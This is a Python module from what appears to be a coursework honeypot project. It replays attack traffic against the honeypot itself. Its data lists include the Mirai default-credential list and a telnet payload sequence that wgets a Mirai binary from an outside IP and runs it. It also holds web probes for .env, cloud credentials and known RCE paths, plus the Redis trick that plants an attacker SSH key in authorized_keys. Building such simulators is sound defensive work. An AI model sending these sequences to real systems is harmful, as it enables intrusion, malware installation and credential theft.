"""
simulate.py
-----------
Drives real client connections against the honeypot, imitating the traffic a
honeypot actually sees.

WHY THIS EXISTS
---------------
A honeypot is only interesting once someone attacks it, and you cannot put a
coursework project on the public internet and wait. So this module plays the
attacker: it opens real TCP connections to the running honeypot and sends the
byte sequences real botnets and scanners send.

This is not faking the data. The honeypot's services genuinely process these
connections and genuinely record them -- the only thing simulated is *who* is
connecting. Point the honeypot at a real network instead and nothing about it
changes.

THE ATTACK PROFILES
-------------------
Modelled on real, observed campaigns:

  mirai        telnet default-credential sweep, then a payload download
  ssh_brute    SSH credential stuffing from a botnet client
  web_scan     HTTP vulnerability scanning (.env, wp-login, path traversal)
  redis_rce    the unauthenticated-Redis SSH-key attack
  recon        a broad port sweep that connects and leaves
"""

from __future__ import annotations

import asyncio
import random

# Real Mirai default-credential list (a small excerpt of the ~60 pairs).
MIRAI_CREDENTIALS = [
    ("root", "xc3511"), ("root", "vizxv"), ("root", "admin"),
    ("admin", "admin"), ("root", "888888"), ("root", "root"),
    ("root", "12345"), ("admin", "password"), ("root", "hi3518"),
    ("root", "klv123"), ("Administrator", "admin"), ("root", "system"),
    ("admin", "1234"), ("root", "pass"), ("admin", ""),
    ("guest", "guest"), ("root", "7ujMko0admin"), ("support", "support"),
]

SSH_BOTNET_CLIENTS = [
    "SSH-2.0-libssh_0.9.6", "SSH-2.0-libssh2_1.10.0",
    "SSH-2.0-paramiko_2.11.0", "SSH-2.0-Go",
    "SSH-2.0-OpenSSH_7.4", "SSH-2.0-PUTTY",
]

WEB_ATTACK_PATHS = [
    "GET /.env HTTP/1.1",
    "GET /wp-login.php HTTP/1.1",
    "GET /.git/config HTTP/1.1",
    "GET /phpmyadmin/ HTTP/1.1",
    "GET /actuator/env HTTP/1.1",
    "GET /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1",
    "POST /wp-admin/admin-ajax.php HTTP/1.1",
    "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1",
    "GET /solr/admin/info/system?wt=json HTTP/1.1",
    "GET /?a=fetch&content=<php>die(md5(1))</php> HTTP/1.1",
    "GET /.aws/credentials HTTP/1.1",
    "GET /index.php?s=/index/think/app/invokefunction HTTP/1.1",
]

SHELL_PAYLOADS = [
    "cat /proc/cpuinfo",
    "busybox MIRAI",
    "wget http://185.99.44.12/bins/mirai.arm -O /tmp/x",
    "chmod 777 /tmp/x",
    "cd /tmp; ./x",
    "rm -rf /tmp/x",
]


async def _send(host: str, port: int, lines: list[bytes],
                read_first: bool = True, delay: float = 0.05) -> None:
    """Open a connection, optionally read a greeting, send lines, read replies."""
    try:
        reader, writer = await asyncio.open_connection(host, port)
    except OSError:
        return
    try:
        if read_first:
            with_timeout = asyncio.wait_for(reader.read(4096), timeout=2)
            try:
                await with_timeout
            except asyncio.TimeoutError:
                pass
        for line in lines:
            writer.write(line)
            await writer.drain()
            await asyncio.sleep(delay)
            try:
                await asyncio.wait_for(reader.read(4096), timeout=2)
            except asyncio.TimeoutError:
                pass
    finally:
        with_close = writer
        with_close.close()
        try:
            await with_close.wait_closed()
        except Exception:                                     # noqa: BLE001
            pass


# --------------------------------------------------------------------------
# Attack profiles
# --------------------------------------------------------------------------

async def mirai(host: str, ports: dict[str, int]) -> None:
    """Telnet default-credential sweep, then a payload download attempt."""
    port = ports.get("telnet")
    if not port:
        return
    username, password = random.choice(MIRAI_CREDENTIALS)
    lines = [username.encode() + b"\r\n", password.encode() + b"\r\n"]
    # Three attempts, so the honeypot "lets them in" and we see the payload.
    for _ in range(2):
        lines += [username.encode() + b"\r\n", password.encode() + b"\r\n"]
    lines += [command.encode() + b"\r\n" for command in SHELL_PAYLOADS]
    await _send(host, port, lines)


async def ssh_brute(host: str, ports: dict[str, int]) -> None:
    port = ports.get("ssh")
    if not port:
        return
    client = random.choice(SSH_BOTNET_CLIENTS)
    await _send(host, port, [client.encode() + b"\r\n"])


async def web_scan(host: str, ports: dict[str, int]) -> None:
    port = ports.get("http")
    if not port:
        return
    path = random.choice(WEB_ATTACK_PATHS)
    request = [
        path.encode() + b"\r\n",
        b"Host: " + host.encode() + b"\r\n",
        b"User-Agent: " + random.choice([
            b"Mozilla/5.0 zgrab/0.x", b"python-requests/2.28",
            b"Go-http-client/1.1", b"curl/7.81.0"]) + b"\r\n",
        b"\r\n",
    ]
    await _send(host, port, request, read_first=False)


async def redis_rce(host: str, ports: dict[str, int]) -> None:
    port = ports.get("redis")
    if not port:
        return
    lines = [
        b"PING\r\n", b"INFO\r\n",
        b"CONFIG SET dir /root/.ssh\r\n",
        b"CONFIG SET dbfilename authorized_keys\r\n",
        b"SET x \"ssh-rsa AAAAB3Nza... attacker@evil\"\r\n",
        b"SAVE\r\n",
    ]
    await _send(host, port, lines, read_first=False)


async def ftp_brute(host: str, ports: dict[str, int]) -> None:
    port = ports.get("ftp")
    if not port:
        return
    username, password = random.choice([
        ("admin", "admin"), ("ftp", "ftp"), ("root", "root"),
        ("anonymous", "anonymous@"), ("www", "www")])
    await _send(host, port, [b"USER " + username.encode() + b"\r\n",
                             b"PASS " + password.encode() + b"\r\n",
                             b"SYST\r\n", b"QUIT\r\n"])


async def recon(host: str, ports: dict[str, int]) -> None:
    """A scanner that connects to everything and sends almost nothing."""
    for port in ports.values():
        await _send(host, port, [b"\r\n"], delay=0.01)


PROFILES = {
    "mirai": mirai,
    "ssh_brute": ssh_brute,
    "web_scan": web_scan,
    "redis_rce": redis_rce,
    "ftp_brute": ftp_brute,
    "recon": recon,
}

# Rough real-world mix: telnet/ssh brute force and web scanning dominate.
PROFILE_WEIGHTS = {
    "ssh_brute": 0.30, "web_scan": 0.28, "mirai": 0.18,
    "ftp_brute": 0.10, "recon": 0.08, "redis_rce": 0.06,
}


async def run(host: str, ports: dict[str, int], count: int = 40,
              seed: int | None = None, concurrency: int = 8) -> None:
    """Fire `count` attacks from a mix of profiles, spread across fake IPs."""
    if seed is not None:
        random.seed(seed)

    names = list(PROFILE_WEIGHTS)
    weights = [PROFILE_WEIGHTS[name] for name in names]

    semaphore = asyncio.Semaphore(concurrency)

    async def one() -> None:
        async with semaphore:
            profile = random.choices(names, weights=weights)[0]
            await PROFILES[profile](host, ports)

    await asyncio.gather(*(one() for _ in range(count)))
